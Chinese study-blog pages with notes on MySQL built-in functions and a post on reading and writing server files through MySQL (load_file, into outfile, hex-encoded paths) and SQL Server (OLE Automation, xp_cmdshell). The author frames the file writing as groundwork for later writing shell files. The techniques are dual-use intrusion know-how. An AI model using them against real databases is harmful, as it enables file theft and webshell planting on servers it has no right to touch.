<p>1.2 拼接字符串concat</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat (&apos;Hello&apos;,&apos;Word!&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566367120384.png" alt="1566367120384"></p>
<p>1.3 查看字符串长度length</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select length (&apos;12314566&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566367237274.png" alt="1566367237274"></p>
<p>1.4 截取字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select left (str,len); 返回str左边的前len个字符</span><br><span class="line">select left (&apos;hello word!&apos;,5);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566367412322.png" alt="1566367412322"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select right(str,len);返回str右边的后Len字符</span><br><span class="line">select right(&apos;hello word!&apos;,5);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566367618749.png" alt="1566367618749"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substring(str,pos,len);返回str的pos位置起的len个字符，substring后面严禁加空格</span><br><span class="line">select substring(&apos;hello word&apos;,5,5);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566368883258.png" alt="1566368883258"></p>
<p>1.5 去除空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ltrim(&apos; abc dve d &apos;);返回删除左空格的字符串str</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566369137825.png" alt="1566369137825"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rtrim(&apos; abc dve d &apos;);返回删除右空格的字符串str</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566369294596.png" alt="1566369294596"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select trim(方向,remstr from str);返回从某侧remstr后的字符串，方向词包括both（两侧），leading(左侧),trailing(右侧)；</span><br><span class="line">select trim(leading,&apos;a&apos;from&apos;aaaabbbbdcddaaa&apos;);删除左侧所有a的，并输出字符串</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566370808186.png" alt="1566370808186"></p>
<p>1.6 返回有N个空格组成的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select space(5);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566370903245.png" alt="1566370903245"></p>
<p>1.7 大小写转换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select lower(&apos;MYSQL&apos;);转换为小写</span><br><span class="line">select upper(&apos;mysql&apos;);转换为大写</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566371081414.png" alt="1566371081414"></p>
<h5 id="2-数字函数"><a href="#2-数字函数" class="headerlink" title="2.数字函数"></a>2.数字函数</h5><p>2.1 ceil(n)返回大于n最大的整数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ceil(100.1)from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566371906811.png" alt="1566371906811"></p>
<p>2.2 floor(n)返回小于n的最大整数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(100.1)from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372138107.png" alt="1566372138107"></p>
<p>2.3 rand()返回0到1的随机数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand() from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372388262.png" alt="1566372388262"></p>
<p>2.4 round(n,y)将n四舍五入保留y小数位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select round(10.12524,2);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372634987.png" alt="1566372634987"></p>
<p>2.5 truncate(n,y)将n保留y位小数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select truncate(10.12524,2);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372739032.png" alt="1566372739032"></p>
<h5 id="3-日期类函数"><a href="#3-日期类函数" class="headerlink" title="3. 日期类函数"></a>3. 日期类函数</h5><p>3.1 now()返回当前日期时间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select now() from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372853204.png" alt="1566372853204"></p>
<p>3.2 curdate()返回当前日期</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select curdate() from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372933917.png" alt="1566372933917"></p>
<p>3.3 curtime()返回当前时间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select curtime() from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372995731.png" alt="1566372995731"></p>
<p>3.4 week(data)返回日期为一年中的第几周</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select week(&apos;2019-08-21&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566373439359.png" alt="1566373439359"></p>
<p>3.5 year(data)返回日期中的年</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select year(&apos;2019-08-21&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566373618525.png" alt="1566373618525"></p>
<p>3.6 date_format(s,parrern)格式化日期</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select date_format(now(),&apos;%y%m%d&apos;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566373960420.png" alt="1566373960420"></p>
<p><strong>注：</strong>%y  表示两位数字年份。例如：（2017返回17）<br>%Y 表示四位数字年份。例如：（2017返回2017）<br>%m 表示两位数字月份。例如：（01,02，….，12）<br>%c  表示数字的月份。例如：（1,2,3,4…..,12）<br>%M 表示月明，英文名称。<br>%d  表示两位数字的天数。例如：（01,02,03,…..31）<br>%e 表示数字的天数。例如（1,2,3,4,…..,31）<br>%H 表示两位数字的小时数，24小时制。例如：（01,02，…..，24）<br>%i  表示两位数字的分钟数。例如：（01,02…,60）<br>%S %s 表示两位数字的秒数。例如：（01,02…,60）</p>
<p>3.7 datediff(d1,d2)返回d1与d2相差的天数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select datediff(&apos;2019-08-21&apos;,&apos;2019-07-31&apos;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566374218864.png" alt="1566374218864"></p>
<p>3.8 to_days(data)返回data从0年来的天数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select to_days(&apos;2019-08-21&apos;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566374386478.png" alt="1566374386478"></p>
<h5 id="4-流程控制类函数"><a href="#4-流程控制类函数" class="headerlink" title="4. 流程控制类函数"></a>4. 流程控制类函数</h5><p>4.1 if(v,t,f)如果v为真返回t,否则返回f</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1!=1,&apos;1&apos;,&apos;2&apos;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566374725514.png" alt="1566374725514"></p>
<p>4.2 ifnull(v1,v2)如果v1不为空则返回v1否则返回v2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ifnull(&apos;1&apos;,&apos;2&apos;);</span><br><span class="line">select ifnull(null,&apos;2&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566375881842.png" alt="1566375881842"></p>
<p>4.3 case when v then v1 end 判断如果v为真则返回v1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select case when 1=1 then &apos;true&apos; else &apos;false&apos; end from dual; 返回为true</span><br><span class="line">select case when 1!=1 then &apos;true&apos; else &apos;false&apos; end from dual; 返回false</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566376252417.png" alt="1566376252417"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when 1!=1 then &apos;true&apos; when 2=2 then &apos;mysql&apos; else &apos;false&apos; end from dual; 返回为mysql</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566376465597.png" alt="1566376465597"></p>
<h5 id="5-转换类函数"><a href="#5-转换类函数" class="headerlink" title="5. 转换类函数"></a>5. 转换类函数</h5><p>cast(v as type);转换数据类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cast(&apos;20180222&apos; as time);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566376783714.png" alt="1566376783714"></p>
<p><strong>注：</strong>Type参数：</p>
<ul>
<li><p>字符型：CHAR</p>
</li>
<li><p>日期：DATE     </p>
</li>
<li><p>时间：TIME</p>
</li>
<li><p>日期时间型：DATETIME</p>
</li>
<li><p>浮点数：DECIMAL</p>
</li>
<li><p>整数：SIGNED</p>
</li>
<li><p>无符号整数：UNSIGNED</p>
</li>
</ul>
<h5 id="6-数据库类函数"><a href="#6-数据库类函数" class="headerlink" title="6.数据库类函数"></a>6.数据库类函数</h5><ul>
<li><p>DATABASE() 返回当前数据库名称</p>
</li>
<li><p>VERSION() 返回当前数据库版本</p>
</li>
<li><p>INET_ATON(ip) 返回数字表示的IP</p>
</li>
<li><p>INET_NTOA(num) 将数字表示的IP转换为IP</p>
</li>
<li><p>PASSWORD(s) 返回加密版本</p>
</li>
<li><p>MD5(s) 返回MD5加密</p>
</li>
</ul>
<ol start="7">
<li><h5 id="system"><a href="#system" class="headerlink" title="system"></a>system</h5><p>mysql通过system后面衔接系统命令可以进行系统的查看，但仅限本地进行操作。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ls /etc;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566377658806.png" alt="1566377658806"></p>
<p>远程进行操作如下：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566377714000.png" alt="1566377714000"></p>
<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://blog.csdn.net/cl_andywin/article/details/72886889" target="_blank" rel="noopener">https://blog.csdn.net/cl_andywin/article/details/72886889</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/09/数据库系统表相关学习-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/09/数据库系统表相关学习-3/" itemprop="url">数据库系统表相关学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-09T16:55:34+08:00">
                2019-09-09
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/09/09/数据库系统表相关学习-3/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/09/09/数据库系统表相关学习-3/" class="cy_cmt_count" data-xid="2019/09/09/数据库系统表相关学习-3/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/09/09/数据库系统表相关学习-3/" class="leancloud_visitors" data-flag-title="数据库系统表相关学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h1 id="数据库系统表相关学习—-3"><a href="#数据库系统表相关学习—-3" class="headerlink" title="数据库系统表相关学习—-3"></a>数据库系统表相关学习—-3</h1><h2 id="1-利用数据库功能进行文件的读取。"><a href="#1-利用数据库功能进行文件的读取。" class="headerlink" title="1.利用数据库功能进行文件的读取。"></a>1.利用数据库功能进行文件的读取。</h2><h4 id="1-1-Mysql文件读写方式"><a href="#1-1-Mysql文件读写方式" class="headerlink" title="1.1 Mysql文件读写方式:"></a>1.1 Mysql文件读写方式:</h4><p><strong>Mysql</strong>数据库对本地文件进行读写的时候需要<strong>权限足够</strong>，读取方式分为3种，分别为<strong>load_file()、load data infile()、system cat。</strong></p>
<p>要进行读写首先需要2点，拥有file的权限，其次secure_file_priv不为NULL。如果secure_file_priv下有文件的路径则load_file()、load data infile()命令只能对该文件路径下的文件进行读取。</p>
<p>读取secure_file_priv的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565686758281.png" alt="1565686758281"></p>
<h5 id="1-1-1-通过load-file-进行文件读取"><a href="#1-1-1-通过load-file-进行文件读取" class="headerlink" title="1.1.1 通过load_file()进行文件读取"></a>1.1.1 通过load_file()进行文件读取</h5><ul>
<li><h5 id="正确的读取方式："><a href="#正确的读取方式：" class="headerlink" title="正确的读取方式："></a>正确的读取方式：</h5></li>
</ul>
<p>目前为mysql本地的secure_file_priv的路径为/var/lib/mysql-files。</p>
<p>首先我在/var/lib/mysql-files/路径下创建一个test1.txt文件并加入内容。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565687810288.png" alt="1565687810288"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use test1 (我本地的一个库)</span><br><span class="line">create table user1(shell text);（创建一个表单名字为user1,并以shell为键）</span><br><span class="line">insert into user1(shell) values (load_file(&apos;/var/lib/mysql-files/test1.txt&apos;));(将系统中的test.txt文件内容插入到user1表中)</span><br><span class="line">select * from user1;（查看user1表）</span><br></pre></td></tr></table></figure>

<p>查询结果：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565687911622.png" alt="1565687911622"></p>
<ul>
<li><h5 id="如果我查询别的路径的文件的话（错误操作）："><a href="#如果我查询别的路径的文件的话（错误操作）：" class="headerlink" title="如果我查询别的路径的文件的话（错误操作）："></a>如果我查询别的路径的文件的话（错误操作）：</h5></li>
</ul>
<p>在/tmp下创建一个test.txt文件：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565688229539.png" alt="1565688229539"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use test1 </span><br><span class="line">create table user1(shell text);</span><br><span class="line">insert into user1(shell) values (load_file(&apos;/tmp/test.txt&apos;));</span><br><span class="line">select * from user1;</span><br></pre></td></tr></table></figure>

<p>返回结果为NULL</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565688336967.png" alt="1565688336967"></p>
<h5 id="只有当secure-file-priv路径参数为空并且有目录权限时，可通过load-file（）命令对指定的文件进行查看。"><a href="#只有当secure-file-priv路径参数为空并且有目录权限时，可通过load-file（）命令对指定的文件进行查看。" class="headerlink" title="只有当secure_file_priv路径参数为空并且有目录权限时，可通过load_file（）命令对指定的文件进行查看。"></a>只有当secure_file_priv路径参数为空并且有目录权限时，可通过load_file（）命令对指定的文件进行查看。</h5><p>首先在<strong>/etc/my.cnf</strong>的[mysqld]下面添加local-infile=0选项，重启mysql服务。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565689123881.png" alt="1565689123881"></p>
<p>查询secure_file_priv路径值：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565689927342.png" alt="1565689927342"></p>
<p>进行/tmp路径下的文件读取</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565690023485.png" alt="1565690023485"></p>
<p>注：若mysql用户没有目录权限也会导致读取失败</p>
<ul>
<li><h5 id="同时也可以进行下面方式进行读取："><a href="#同时也可以进行下面方式进行读取：" class="headerlink" title="同时也可以进行下面方式进行读取："></a>同时也可以进行下面方式进行读取：</h5></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;/tmp/test.txt&apos;);(secure_file_priv路径为空时可以读取该目录，有路径时需读取路径目录)</span><br><span class="line">select load_file(0x2F746D702F746573742E747874);(同时也可以通过16进制转换进行文件读取，注16进行进行读取时候不需要加引号进行转换)</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565747126504.png" alt="1565747126504"></p>
<h5 id="1-1-2-load-data-infile-进行文件的读取"><a href="#1-1-2-load-data-infile-进行文件的读取" class="headerlink" title="1.1.2 load data infile 进行文件的读取"></a>1.1.2 <strong>load data infile</strong> 进行文件的读取</h5><p>load data infile与load_file()属性一样，都是需要基于secure_file_priv路径值，需要为空路径才可以进任意目录下的文件读取。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use test1 </span><br><span class="line">create table user1(shell text);</span><br><span class="line">load data infile &apos;/tmp/test.txt&apos; into user1;</span><br><span class="line">select * from user1;</span><br></pre></td></tr></table></figure>

<p>成功读取到文件：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565706354929.png" alt="1565706354929"></p>
<h5 id="1-1-3-通过system-cat命令进行文件读取"><a href="#1-1-3-通过system-cat命令进行文件读取" class="headerlink" title="1.1.3 通过system cat命令进行文件读取"></a>1.1.3 通过system cat命令进行文件读取</h5><p>通过system cat 系统命令可以直接读取文件，但是<strong>该方法只能本地进行文件读取，远程mysql时候不能使用system，无法越权读取。</strong></p>
<p>本地读取：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565706940244.png" alt="1565706940244"></p>
<p>远程读取：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565706991730.png" alt="1565706991730"></p>
<h5 id="1-1-4-通过数据库插入文件（方便以后写shell文件）"><a href="#1-1-4-通过数据库插入文件（方便以后写shell文件）" class="headerlink" title="1.1.4 通过数据库插入文件（方便以后写shell文件）"></a>1.1.4 通过数据库插入文件（方便以后写shell文件）</h5><p>通过into outfile或into dumpfile参数可以进行文件的写入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select &apos;123123&apos; into outfile &apos;/tmp/test1.txt&apos;; （将123123写入/tmp/test1.txt（新建的文件）文件中，该命令需要该目录下之前没有该文件）</span><br><span class="line">select &apos;123123&apos; into dumpfile &apos;/tmp/test1.txt&apos;; </span><br><span class="line"> select   0x31323334   into outfile &apos;/tmp/test12.txt&apos;;(也可以通过16进制转换进行写入，也不需要加引号进行转换)</span><br><span class="line"> select   0x31323334   into dumpfile &apos;/tmp/test12.txt&apos;;</span><br></pre></td></tr></table></figure>

<p>写入成功：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565707844767.png" alt="1565707844767"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565747321130.png" alt="1565747321130"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565747448703.png" alt="1565747448703"></p>
<p>注：写入也需要secure_file_priv路径属性为空或者在该默认路径下进行写入。</p>
<h4 id="1-2-SQLserver文件读写方式："><a href="#1-2-SQLserver文件读写方式：" class="headerlink" title="1.2 SQLserver文件读写方式："></a>1.2 SQLserver文件读写方式：</h4><p>SQLserver对文件进行读取时候有3种方式可以进行读取BULK INSERT、Script.FileSystemObject方式。</p>
<h5 id="1-2-1-BULK-INSERT进行文件读取："><a href="#1-2-1-BULK-INSERT进行文件读取：" class="headerlink" title="1.2.1 BULK INSERT进行文件读取："></a>1.2.1 BULK INSERT进行文件读取：</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> iptable(res <span class="built_in">varchar</span>(<span class="number">8000</span>));（创建一个表名字为iptable，列名为ip）</span><br><span class="line">bulk <span class="keyword">insert</span> iptable <span class="keyword">from</span> <span class="string">'c:/ip.txt'</span>;(将ip.txt的数据导入iptable表)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> iptable;</span><br></pre></td></tr></table></figure>

<p>输入结果：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565748628703.png" alt="1565748628703"></p>
<h5 id="1-2-2-Script-FileSystemObject进行读写"><a href="#1-2-2-Script-FileSystemObject进行读写" class="headerlink" title="1.2.2  Script.FileSystemObject进行读写"></a>1.2.2  Script.FileSystemObject进行读写</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启Ole Automation Procedures</span></span><br><span class="line">sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1;</span></span><br><span class="line"><span class="string">RECONFIGURE;</span></span><br><span class="line"><span class="string">sp_configure '</span>Ole Automation Procedures<span class="string">',1;</span></span><br><span class="line"><span class="string">RECONFIGURE;</span></span><br><span class="line"><span class="string">RECONFIGURE WITH OVERRIDE；</span></span><br></pre></td></tr></table></figure>

<h5 id="读取文件："><a href="#读取文件：" class="headerlink" title="读取文件："></a>读取文件：</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> @o <span class="built_in">int</span>, @f <span class="built_in">int</span>, @t <span class="built_in">int</span>, @ret <span class="built_in">int</span></span><br><span class="line"><span class="keyword">declare</span> @line <span class="built_in">varchar</span>(<span class="number">8000</span>)</span><br><span class="line">exec sp_oacreate <span class="string">'scripting.filesystemobject'</span>,@o <span class="keyword">out</span></span><br><span class="line">exec sp_oamethod @o, <span class="string">'opentextfile'</span>, @f <span class="keyword">out</span>, <span class="string">'c:\ip1.txt'</span>, <span class="number">1</span></span><br><span class="line">exec @ret = sp_onmethod @f, <span class="string">'readline'</span>, @line <span class="keyword">out</span></span><br><span class="line"><span class="keyword">while</span>(@ret = <span class="number">0</span>) <span class="keyword">begin</span> print @line exec @ret = sp_oamethod @f, <span class="string">'readline'</span>, @line <span class="keyword">out</span> <span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565750294814.png" alt="1565750294814"></p>
<h5 id="写入文件："><a href="#写入文件：" class="headerlink" title="写入文件："></a>写入文件：</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> @o <span class="built_in">int</span>, @f <span class="built_in">int</span>, @t <span class="built_in">int</span>, @ret <span class="built_in">int</span></span><br><span class="line"><span class="keyword">declare</span> @line <span class="built_in">varchar</span>(<span class="number">8000</span>)</span><br><span class="line">exec sp_oacreate <span class="string">'scripting.filesystemobject'</span>,@o <span class="keyword">out</span></span><br><span class="line">exec sp_oamethod @o, <span class="string">'createtextfile'</span>, @f <span class="keyword">out</span>, <span class="string">'c:\ip1.txt'</span>, <span class="number">1</span></span><br><span class="line">exec @ret = sp_oamethod @f, <span class="string">'writeline'</span>, <span class="literal">NULL</span> ,<span class="string">'11111111'</span></span><br></pre></td></tr></table></figure>

<p>输入结果：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565750480871.png" alt="1565750480871"></p>
<p>注：该方式以覆盖写入为主，如果目标目录无文件则写入失败</p>
<p>同时也可以通过xp_cmdshell进行写入（但数据库需要启用xp_cmdshell才可以进行文件写入）：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell 'echo test&gt;c:\1.txt'</span><br></pre></td></tr></table></figure>

<h2 id="2-数据库系统库与表学习"><a href="#2-数据库系统库与表学习" class="headerlink" title="2.数据库系统库与表学习"></a>2.数据库系统库与表学习</h2><h4 id="2-1-mysql系统库与表学习"><a href="#2-1-mysql系统库与表学习" class="headerlink" title="2.1 mysql系统库与表学习"></a>2.1 mysql系统库与表学习</h4><p>mysql默认库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

